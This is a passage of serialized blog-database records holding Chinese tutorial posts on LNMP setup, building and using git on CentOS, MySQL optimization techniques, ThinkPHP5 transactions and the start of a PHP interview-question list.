	这几天没啥事情，就琢磨着再练习一下搭建lnmp环境；
</p>
<p>
	因为之前搭建的都是lamp环境，这次换个Nginx（虽然没啥大的区别.....）
</p>
<p>
	于是便装了个虚拟机，和一个centos6.5的Linux系统；
</p>
<p>
	然后在csdn上找到了一篇不错的博文，分享记录下来
</p>
<p>
	传送门:<a href="http://blog.csdn.net/weixin_37194108/article/details/70317816" target="_blank">http://blog.csdn.net/weixin_37194108/article/details/70317816</a>
</p>
<p>
	<img src="/static/admin/kindeditor/attached/image/20180131/20180131211656_91774.png" alt="" />
</p>";s:6:"author";s:6:"转载";s:8:"keywords";s:10:"LNMP环境";s:7:"is_show";i:1;s:9:"is_delete";i:0;s:4:"sort";i:81;s:5:"click";i:73;s:11:"comment_num";i:0;s:11:"description";s:34:"centos6.5下完美搭建LNMP环境";s:5:"ap_id";i:62;s:4:"path";s:20:"/upload/138thumb.png";}i:5;a:15:{s:3:"aid";i:135;s:5:"title";s:39:"windows本地环境连接linux服务器";s:11:"create_time";i:1516262671;s:3:"cid";i:2;s:7:"content";s:4063:"<p>
	在使用GitHub和git的仓库代码管理之后，突然想到，如果是公司的私有开发项目；
</p>
<p>
	公司的服务器是Linux服务器，而我们的本地开发环境是windows；
</p>
<p>
	这时候有个大型的项目需要联合开发，不可能每个人同时开发同一个项目吧？
</p>
<p>
	所以我们要用到Git这个分布式管理工具；
</p>
<p>
	首先我们在Linux搭建好Git，安装Git
</p>
<p>
	<br />
</p>
<h2 style="font-size:20px;font-family:Verdana, Arial, Helvetica, sans-serif;background-color:#FFFFFF;">
	一、<a id="cb_post_title_url" href="http://www.cnblogs.com/fuyuanming/p/5804695.html"><span style="color:#000000;font-size:18px;">centos6.5 安装git</span></a> 
</h2>
<div class="postbody" style="font-family:Verdana, Arial, Helvetica, sans-serif;font-size:14px;background-color:#FFFFFF;">
	<div id="cnblogs_post_body" class="blogpost-body">
		<p>
			1.安装编译git时需要的包
		</p>
		<div class="cnblogs_code" style="background-color:#F5F5F5;border:1px solid #CCCCCC;padding:5px;margin:5px 0px;font-family:&quot;font-size:12px !important;">
<pre># yum install curl-devel expat-devel gettext-devel openssl-devel zlib-<span style="line-height:1.5 !important;">devel

# yum install  gcc perl</span>-ExtUtils-MakeMaker</pre>
		</div>
		<p>
			2.删除已有的git
		</p>
		<div class="cnblogs_code" style="background-color:#F5F5F5;border:1px solid #CCCCCC;padding:5px;margin:5px 0px;font-family:&quot;font-size:12px !important;">
<pre># yum remove git</pre>
		</div>
		<p>
			3.下载git源码，我自己下载的是2.0.0版本的下载地址：<a href="http://pan.baidu.com/s/1qXFnOxI" target="_blank">http://pan.baidu.com/s/1qXFnOxI</a> 
		</p>
		<div class="cnblogs_code" style="background-color:#F5F5F5;border:1px solid #CCCCCC;padding:5px;margin:5px 0px;font-family:&quot;font-size:12px !important;">
<pre># cd /usr/<span style="line-height:1.5 !important;">src
# wget https:</span><span style="color:#008000;line-height:1.5 !important;">//</span><span style="color:#008000;line-height:1.5 !important;">www.kernel.org/pub/software/scm/git/git-2.0.5.tar.gz</span> # tar xzf git-2.0.5.tar.gz</pre>
		</div>
		<p>
			4.编译安装
		</p>
		<div class="cnblogs_code" style="background-color:#F5F5F5;border:1px solid #CCCCCC;padding:5px;margin:5px 0px;font-family:&quot;font-size:12px !important;">
<pre># cd git-2.0.5<span style="line-height:1.5 !important;"> # make prefix</span>=/usr/local/<span style="line-height:1.5 !important;">git all
# make prefix</span>=/usr/local/<span style="line-height:1.5 !important;">git install
# echo </span>"export PATH=$PATH:/usr/local/git/bin" &gt;&gt; /etc/<span style="line-height:1.5 !important;">bashrc
# source </span>/etc/bashrc</pre>
		</div>
		<p>
			5.检查一下版本号
		</p>
		<div class="cnblogs_code" style="background-color:#F5F5F5;border:1px solid #CCCCCC;padding:5px;margin:5px 0px;font-family:&quot;font-size:12px !important;">
<pre># git --version</pre>
		</div>
	</div>
</div>
<strong>二、安装好之后，就是使用Git</strong> 
<p>
	<br />
</p>
<p>
	使用的话，我们分以下几步
</p>
<p>
	服务器端：<br />
$ cd /data/wwwroot/yuqingyong<br />
$ git init
</p>
<p>
	<br />
将项目内容提交到仓库（没有该步骤，仓库为空）：<br />
$ git add -A<br />
$ git commit -m '项目初始化'
</p>
<p>
	<br />
允许远程提交到该仓库：<br />
$ echo \[receive\] &gt;&gt; .git/config<br />
$ echo "denyCurrentBranch = false" &gt;&gt; .git/config<br />
<br />
本地设置：<br />
$ cd /d/phpstudy/www<br />
$ git clone yuqingyong@139.196.93.247:/data/wwwroot/yuqingyong<br />
推送远程仓库：<br />
$ git push -u origin master<br />
<br />
若本地修改推送远程后，远程仓库看不到更新，则在远程仓库执行如下命令（一次即可）：<br />
$ git reset --hard
</p>
<p>
	<img src="/static/admin/kindeditor/attached/image/20180118/20180118160336_58010.jpg" alt="" /> 
</p>";s:6:"author";s:9:"谌大神";s:8:"keywords";s:3:"git";s:7:"is_show";i:1;s:9:"is_delete";i:0;s:4:"sort";i:79;s:5:"click";i:102;s:11:"comment_num";i:0;s:11:"description";s:54:"windows本地环境连接linux服务器的仓库项目";s:5:"ap_id";i:60;s:4:"path";s:20:"/upload/135thumb.png";}i:6;a:15:{s:3:"aid";i:134;s:5:"title";s:41:"关于mysql数据库优化的一篇文章";s:11:"create_time";i:1516076514;s:3:"cid";i:2;s:7:"content";s:16214:"<p>
	之前一直对于MySQL数据库优化这方面的知识有些模糊；
</p>
<p>
	只知道优化的一些大致方法，并不知道怎么具体操作，因为很少接触大型项目；
</p>
<p>
	添加索引，优化sql语句，事务处理等等.....
</p>
<p>
	那到底怎么具体实现呢？在什么情况下添加索引呢？事务在什么情况下应该要使用呢？
</p>
<p>
	嗯，今天我逛了一遍博客，论坛之后，看到了一篇不错的博文，记录一下，<span style="background-color:#E53333;">非原创；</span> 
</p>
<p>
	<span style="background-color:#E53333;"><span style="background-color:#FFFFFF;">最后我把网址链接也写出来:<a href="http://blog.csdn.net/timecolor/article/details/8887421" target="_blank">http://blog.csdn.net/timecolor/article/details/8887421</a></span><span style="background-color:#FFFFFF;">&nbsp; 里面还有不少好的文章</span></span>
</p>
<p>
	<span style="background-color:#E53333;"><span style="color: rgb(69, 69, 69); background-color: rgb(255, 255, 255);" font-size:16px;background-color:#ffffff;"="">1、选取最适用的字段属性</span> </span>
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		MySQL可以很好的支持大数据量的存取，但是一般说来，数据库中的表越小，在它上面执行的查询也就会越快。因此，在创建表的时候，为了获得更好的性能，我们可以将表中字段的宽度设得尽可能小。例如，在定义邮政编码这个字段时，如果将其设置为CHAR(255),显然给数据库增加了不必要的空间，甚至使用VARCHAR这种类型也是多余的，因为CHAR(6)就可以很好的完成任务了。同样的，如果可以的话，我们应该使用MEDIUMINT而不是BIGIN来定义整型字段。
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		另外一个提高效率的方法是在可能的情况下，应该尽量把字段设置为NOT NULL，这样在将来执行查询的时候，数据库不用去比较NULL值。
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		对于某些文本字段，例如“省份”或者“性别”，我们可以将它们定义为ENUM类型。因为在MySQL中，ENUM类型被当作数值型数据来处理，而数值型数据被处理起来的速度要比文本类型快得多。这样，我们又可以提高数据库的性能。
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		2、使用连接（JOIN）来代替子查询(Sub-Queries)
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		MySQL从4.1开始支持SQL的子查询。这个技术可以使用SELECT语句来创建一个单列的查询结果，然后把这个结果作为过滤条件用在另一个查询中。例如，我们要将客户基本信息表中没有任何订单的客户删除掉，就可以利用子查询先从销售信息表中将所有发出订单的客户ID取出来，然后将结果传递给主查询，如下所示：
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		DELETE FROM customerinfo WHERE CustomerID NOT in (SELECT CustomerID FROM salesinfo )
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		使用子查询可以一次性的完成很多逻辑上需要多个步骤才能完成的SQL操作，同时也可以避免事务或者表锁死，并且写起来也很容易。但是，有些情况下，子查询可以被更有效率的连接（JOIN）.. 替代。例如，假设我们要将所有没有订单记录的用户取出来，可以用下面这个查询完成：
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		SELECT * FROM customerinfo WHERE CustomerID NOT in (SELECT CustomerID FROM salesinfo )
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		如果使用连接（JOIN）.. 来完成这个查询工作，速度将会快很多。尤其是当salesinfo表中对CustomerID建有索引的话，性能将会更好，查询如下：
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		SELECT * FROM customerinfo LEFT JOIN salesinfoON customerinfo.CustomerID=salesinfo. CustomerID WHERE salesinfo.CustomerID IS NULL
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		连接（JOIN）.. 之所以更有效率一些，是因为 MySQL不需要在内存中创建临时表来完成这个逻辑上的需要两个步骤的查询工作。
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		3、使用联合(UNION)来代替手动创建的临时表
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		MySQL 从 4.0 的版本开始支持 UNION 查询，它可以把需要使用临时表的两条或更多的 SELECT 查询合并的一个查询中。在客户端的查询会话结束的时候，临时表会被自动删除，从而保证数据库整齐、高效。使用 UNION 来创建查询的时候，我们只需要用 UNION作为关键字把多个 SELECT 语句连接起来就可以了，要注意的是所有 SELECT 语句中的字段数目要想同。下面的例子就演示了一个使用 UNION的查询。
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		SELECT Name, Phone FROM client UNION SELECT Name, BirthDate FROM author<br />
UNION<br />
SELECT Name, Supplier FROM product
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		4、事务
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		尽管我们可以使用子查询（Sub-Queries）、连接（JOIN）和联合（UNION）来创建各种各样的查询，但不是所有的数据库操作都可以只用一条或少数几条SQL语句就可以完成的。更多的时候是需要用到一系列的语句来完成某种工作。但是在这种情况下，当这个语句块中的某一条语句运行出错的时候，整个语句块的操作就会变得不确定起来。设想一下，要把某个数据同时插入两个相关联的表中，可能会出现这样的情况：第一个表中成功更新后，数据库突然出现意外状况，造成第二个表中的操作没有完成，这样，就会造成数据的不完整，甚至会破坏数据库中的数据。要避免这种情况，就应该使用事务，它的作用是：要么语句块中每条语句都操作成功，要么都失败。换句话说，就是可以保持数据库中数据的一致性和完整性。事物以BEGIN 关键字开始，COMMIT关键字结束。在这之间的一条SQL操作失败，那么，ROLLBACK命令就可以把数据库恢复到BEGIN开始之前的状态。
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		BEGIN;
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		INSERT INTO salesinfo SET CustomerID=14;
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		UPDATE inventory SET Quantity=11
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		WHERE item='book';
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		COMMIT;
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		事务的另一个重要作用是当多个用户同时使用相同的数据源时，它可以利用锁定数据库的方法来为用户提供一种安全的访问方式，这样可以保证用户的操作不被其它的用户所干扰。
</p>
<span style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">5、锁定表</span> <p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		尽管事务是维护数据库完整性的一个非常好的方法，但却因为它的独占性，有时会影响数据库的性能，尤其是在很大的应用系统中。由于在事务执行的过程中，数据库将会被锁定，因此其它的用户请求只能暂时等待直到该事务结束。如果一个数据库系统只有少数几个用户
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		来使用，事务造成的影响不会成为一个太大的问题；但假设有成千上万的用户同时访问一个数据库系统，例如访问一个电子商务网站，就会产生比较严重的响应延迟。
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		其实，有些情况下我们可以通过锁定表的方法来获得更好的性能。下面的例子就用锁定表的方法来完成前面一个例子中事务的功能。
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		LOCK TABLE inventory WRITE<br />
SELECT Quantity FROM inventory<br />
WHEREItem='book';<br />
...
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		UPDATE inventory SET Quantity=11<br />
WHEREItem='book';<br />
UNLOCK TABLES
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		这里，我们用一个 SELECT 语句取出初始数据，通过一些计算，用 UPDATE 语句将新值更新到表中。包含有 WRITE 关键字的 LOCK TABLE 语句可以保证在 UNLOCK TABLES 命令被执行之前，不会有其它的访问来对 inventory 进行插入、更新或者删除的操作。
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		6、使用外键
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		锁定表的方法可以维护数据的完整性，但是它却不能保证数据的关联性。这个时候我们就可以使用外键。例如，外键可以保证每一条销售记录都指向某一个存在的客户。在这里，外键可以把customerinfo 表中的CustomerID映射到salesinfo表中CustomerID，任何一条没有合法CustomerID的记录都不会被更新或插入到salesinfo中。
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		CREATE TABLE customerinfo<br />
(<br />
CustomerID INT NOT NULL ,<br />
PRIMARY KEY ( CustomerID )<br />
) TYPE = INNODB;<br />
CREATE TABLE salesinfo<br />
(<br />
SalesID INT NOT NULL,<br />
CustomerID INT NOT NULL,<br />
PRIMARY KEY(CustomerID, SalesID),<br />
FOREIGN KEY (CustomerID) REFERENCES customerinfo<br />
(CustomerID) ON DELETECASCADE<br />
) TYPE = INNODB;
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		注意例子中的参数“ON DELETE CASCADE”。该参数保证当 customerinfo 表中的一条客户记录被删除的时候，salesinfo 表中所有与该客户相关的记录也会被自动删除。如果要在 MySQL 中使用外键，一定要记住在创建表的时候将表的类型定义为事务安全表 InnoDB类型。该类型不是 MySQL 表的默认类型。定义的方法是在 CREATE TABLE 语句中加上 TYPE=INNODB。如例中所示。
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		7、使用索引
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		索引是提高数据库性能的常用方法，它可以令数据库服务器以比没有索引快得多的速度检索特定的行，尤其是在查询语句当中包含有MAX(), MIN()和ORDERBY这些命令的时候，性能提高更为明显。那该对哪些字段建立索引呢？一般说来，索引应建立在那些将用于JOIN, WHERE判断和ORDER BY排序的字段上。尽量不要对数据库中某个含有大量重复的值的字段建立索引。对于一个ENUM类型的字段来说，出现大量重复值是很有可能的情况，例如customerinfo中的“province”.. 字段，在这样的字段上建立索引将不会有什么帮助；相反，还有可能降低数据库的性能。我们在创建表的时候可以同时创建合适的索引，也可以使用ALTER TABLE或CREATE INDEX在以后创建索引。此外，MySQL
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		从版本3.23.23开始支持全文索引和搜索。全文索引在MySQL 中是一个FULLTEXT类型索引，但仅能用于MyISAM 类型的表。对于一个大的数据库，将数据装载到一个没有FULLTEXT索引的表中，然后再使用ALTER TABLE或CREATE INDEX创建索引，将是非常快的。但如果将数据装载到一个已经有FULLTEXT索引的表中，执行过程将会非常慢。
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		8、优化的查询语句
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		绝大多数情况下，使用索引可以提高查询的速度，但如果SQL语句使用不恰当的话，索引将无法发挥它应有的作用。下面是应该注意的几个方面。首先，最好是在相同类型的字段间进行比较的操作。在MySQL 3.23版之前，这甚至是一个必须的条件。例如不能将一个建有索引的INT字段和BIGINT字段进行比较；但是作为特殊的情况，在CHAR类型的字段和VARCHAR类型字段的字段大小相同的时候，可以将它们进行比较。其次，在建有索引的字段上尽量不要使用函数进行操作。
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		例如，在一个DATE类型的字段上使用YEAE()函数时，将会使索引不能发挥应有的作用。所以，下面的两个查询虽然返回的结果一样，但后者要比前者快得多。
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		SELECT * FROM order WHERE YEAR(OrderDate)&lt;2001;<br />
SELECT * FROM order WHERE OrderDate&lt;"<span>2001-01-01</span>";
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		同样的情形也会发生在对数值型字段进行计算的时候：
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		SELECT * FROM inventory WHERE Amount/7&lt;24;<br />
SELECT * FROM inventory WHERE Amount&lt;24*7;
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		上面的两个查询也是返回相同的结果，但后面的查询将比前面的一个快很多。第三，在搜索字符型字段时，我们有时会使用 LIKE 关键字和通配符，这种做法虽然简单，但却也是以牺牲系统性能为代价的。例如下面的查询将会比较表中的每一条记录。
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		SELECT * FROM books<br />
WHERE name like "MySQL%"
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		但是如果换用下面的查询，返回的结果一样，但速度就要快上很多：
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		SELECT * FROM books<br />
WHERE name&gt;="MySQL"and name&lt;"MySQM"
	</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		最后，应该注意避免在查询中让MySQL进行自动类型转换，因为转换过程也会使索引变得不起作用。
</p>
<p style="color:#454545;font-family:" font-size:16px;background-color:#ffffff;"="">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 本文并非原创。
	</p>
<img src="/static/admin/kindeditor/attached/image/20180116/20180116122149_74994.png" alt="" /><br />
	<p>
		<br />
	</p>";s:6:"author";s:8:"wf120355";s:8:"keywords";s:20:"mysql数据库优化";s:7:"is_show";i:1;s:9:"is_delete";i:0;s:4:"sort";i:78;s:5:"click";i:102;s:11:"comment_num";i:0;s:11:"description";s:41:"关于mysql数据库优化的一篇文章";s:5:"ap_id";i:59;s:4:"path";s:20:"/upload/134thumb.png";}i:7;a:15:{s:3:"aid";i:133;s:5:"title";s:24:"thinkphp5的事务处理";s:11:"create_time";i:1514882611;s:3:"cid";i:2;s:7:"content";s:4765:"<p>
	说明一下写这个的缘由，因为之前做商城都是直接处理多表关联数据，没考虑过如果数据中的一环出了问题的后果；
</p>
<p>
	虽然这种几率很小，但是也是不可避免的；
</p>
<p>
	比如我们想象一个场景，用户选择好商品加入购物车之后，购物车内有许多不同的商品，我们下一步需要做的是；
</p>
<p>
	提交订单，提交订单就需要多表操作，我们需要提交一个订单表（order）,一个商品表（order_goods）,甚至还有个
</p>
<p>
	用户优惠券表（coupon）,我们做数据处理，一般都是先处理订单的提交，然后处理商品的记录保存，最后支付完成订单；
</p>
<p>
	而这些操作都是在用户点击提交订单就要做好的数据处理，那如果程序在处理完提交订单，数据也已经添加到了order表之后；
</p>
<p>
	突然，在处理添加商品表的时候发生了异常，数据没有处理完，而且也抛出了异常；
</p>
<p>
	但是，order表中已经记录了提交的订单信息，但是这个订单又没有任何商品详情，那怎么办？
</p>
<p>
	这个订单就成为了一个无效的，并且有可能造成业务事故的订单数据；
</p>
<p>
	这时候我们就需要事务处理来帮忙了，他可以让我们的程序避免出现事故的数据发生。
</p>
<p>
	一：什么是事务处理？
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	使用<span class="highlight" style="background-color:#FFFF00;">事务</span>处理的话，需要数据库引擎支持<span class="highlight" style="background-color:#FFFF00;">事务</span>处理。比如 MySQL 的 MyISAM 不支持<span class="highlight" style="background-color:#FFFF00;">事务</span>处理，需要使用 InnoDB 引擎。
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	使用 transaction 方法操作数据库<span class="highlight" style="background-color:#FFFF00;">事务</span>，当发生异常会自动回滚。
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	这是官方的解释，解释的有点少，大概什么意思呢，先看个例子
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	<img src="/static/admin/kindeditor/attached/image/20180102/20180102163616_46877.png" alt="" />
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	从图中可以看到，事务处理的格式是
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	<br />
</p>
<pre class="prettyprint lang-js">try{
  //主代码区
}catch(Exception $e){
  Db::rollback();
} </pre>
其中主代码去是我们处理数据的操作，值得注意的一点是，提交事务的操作一定是需要在return数据的前面的，不然会一直回滚数据（这个问题困扰了我将近2小时），后来吧提交事务放到return前面就可以正常执行了。
<p>
	<br />
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	至于回滚操作，可以做一些日志记录，以便自己后期复查审核代码。
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	主代码去如果一旦有任何的异常报错，数据库就会立即回滚到操作前，也就防止了数据错误添加的现象；
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	事务操作一般用于多表操作的时候，建议凡是涉及到多表操作的数据处理都使用一下事务操作；
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	以前是没习惯使用事务，现在做的网站越来越复杂了，代码必须越来越谨慎点，如果只是一般的小型企业网站，事务操作可用可不用；
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	毕竟如果要使用事务操作，就必须使用<span style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">InnoDB数据引擎，会牺牲不少的数据读取性能；</span>
</p>
<p style="color:rgba(0, 0, 0, 0.87);font-family:&quot;font-size:15.96px;background-color:#FFFFFF;">
	所以，一般小型的企业网站不太建议使用事务操作，用不上也没必要；
</p>
<p>
	<br />
</p>";s:6:"author";s:6:"本站";s:8:"keywords";s:12:"事务处理";s:7:"is_show";i:1;s:9:"is_delete";i:0;s:4:"sort";i:77;s:5:"click";i:101;s:11:"comment_num";i:1;s:11:"description";s:32:"thinkphp的事务处理注意点";s:5:"ap_id";i:58;s:4:"path";s:20:"/upload/133thumb.png";}i:8;a:15:{s:3:"aid";i:132;s:5:"title";s:16:"2017PHP面试题";s:11:"create_time";i:1513928454;s:3:"cid";i:7;s:7:"content";s:38262:"<blockquote>
	<p style="text-align:left;">
		最近公司的项目做的差不多了，人呢，也空闲下来了；
	</p>
	<p style="text-align:left;">
		正好也快年底了，就想着刷刷面试题目吧，这方面的题目还是看的少啊；
	</p>
	<p style="text-align:left;">
		就去百度了一下，嗯，找到一篇不错的博文；
	</p>
	<p style="text-align:left;">
		原文链接：<a href="https://www.cnblogs.com/zhyunfe/p/6209097.html" target="_blank">https://www.cnblogs.com/zhyunfe/p/6209097.html</a>
	</p>
	<p style="text-align:left;">
		<br />
	</p>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;color:#333333;font-size:14px;">
		<strong><span style="background-color:#E53333;color:#FFFFFF;">1、双引号和单引号的区别</span></strong>
	</div>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">双引号解释变量，单引号不解释变量</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">双引号里插入单引号，其中单引号里如果有变量的话，变量解释</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">双引号的变量名后面必须要有一个非数字、字母、下划线的特殊字符，或者用讲变量括起来，否则会将变量名后面的部分当做一个整体，引起语法错误</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">双引号解释转义字符，单引号不解释转义字符，但是解释'\和\\</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">能使单引号字符尽量使用单引号，单引号的效率比双引号要高（因为双引号要先遍历一遍，判断里面有没有变量，然后再进行操作，而单引号则不需要判断）</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span style="background-color:#E53333;color:#FFFFFF;font-size:14px;font-weight:normal;">2、常用的超全局变量(8个)</span>
	</div>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">$_GET -----&gt;get传送方式</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">$_POST -----&gt;post传送方式</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span><span style="font-size:14px;">$_REQUEST -----&gt;</span></span><span style="font-weight:normal;color:#FFFFFF;font-size:14px;"></span><span><span style="font-size:14px;">可以接收到get和post两种方式的值</span></span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">$GLOBALS -----&gt;所有的变量都放在里面</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">$_FILE -----&gt;上传文件使用</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">$_SERVER -----&gt;系统环境变量</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">$_SESSION -----&gt;会话控制的时候会用到</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">$_COOKIE -----&gt;会话控制的时候会用到</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">3、HTTP中POST、GET、PUT、DELETE方式的区别</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">HTTP定义了与服务器交互的不同的方法，最基本的是POST、GET、PUT、DELETE，与其比不可少的URL的全称是资源描述符，我们可以这样理解：url描述了一个网络上资源，而post、get、put、delegate就是对这个资源进行增、删、改、查的操作！</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span><span style="font-size:14px;"><br />
</span></span>
	</div>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">3.1表单中get和post提交方式的区别</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">get是把参数数据队列加到提交表单的action属性所指的url中，值和表单内各个字段一一对应，从url中可以看到；post是通过HTTPPOST机制，将表单内各个字段与其内容防止在HTML的head中一起传送到action属性所指的url地址，用户看不到这个过程</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
